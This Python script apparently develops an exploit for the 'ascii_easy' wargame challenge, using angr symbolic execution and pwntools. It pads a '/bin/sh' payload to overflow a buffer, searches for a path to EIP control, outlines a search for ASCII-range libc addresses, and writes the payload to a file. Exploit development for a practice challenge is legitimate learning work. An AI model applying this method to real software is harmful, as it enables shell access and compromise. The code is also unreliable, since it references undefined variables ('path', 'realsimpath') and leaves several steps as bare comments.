#!/usr/bin/env python

import pwn
import angr
import claripy


shellcode = b'/bin/sh'
shellcode += b';'*(32 - len(shellcode))


# Control EIP, yay? EIP/EBP are ascii-bound.
# vmmap shows wx libc mmaped:
#   0x5555e000 0x55702000 0x00000000 rwx /home/ascii_easy/libc-2.15.so
# So find functions with ascii addresses in libc-2.15.so with ascii offsets, yeah?

p = angr.Project('ascii_easy', load_options={'auto_load_libs': False})
p.loader

base = claripy.BVV(shellcode, len(shellcode)*8)
eip = claripy.BVS('control_eip', 4*8)
symshell = claripy.Concat(base, eip)
shellcode += pwn.p32(0x5558eed0) # add a placeholder concrete eip in shellcode for now.

state = p.factory.full_init_state(args=['./ascii_easy', symshell])
#state.solver.add(state.posix.argc == 0x02)

# We're gonna need the libc file & do *not* want it to be symoblic.
realpath = 'libc-2.15.so'
simpath = '/home/ascii_easy/libc-2.15.so'
with open(realpath, 'rb') as fh:
    libc_2_15 = fh.read()
simfile = angr.SimFile(simpath, content=libc_2_15)
state.fs.insert(path, simfile)

simgr = p.factory.simgr(state)

# Walk up to the return in vuln?
search = simgr.explore(find=[0x08048532], avoid=[0x0804854c, 0x0804858c, 0x080485ca, 0x0804860b])

print("paths found to eip control: {}".format(len(search.found)))
# next ascii-bound EIP
assert (len(search.found) > 0)
controlled_path = search.found[0]
# next Generate a CFG
libcp = angr.Project(realsimpath, load_options={'auto_load_libs': False})
cfg = libcp.analyses.CFGFast()

# next find addresses that overlap with the function table?

# Constrain EIP by ascii values

# Dump what we used for repro

with open('payload', 'wb') as fh:
    fh.write(shellcode)

import code
code.interact(local=locals())
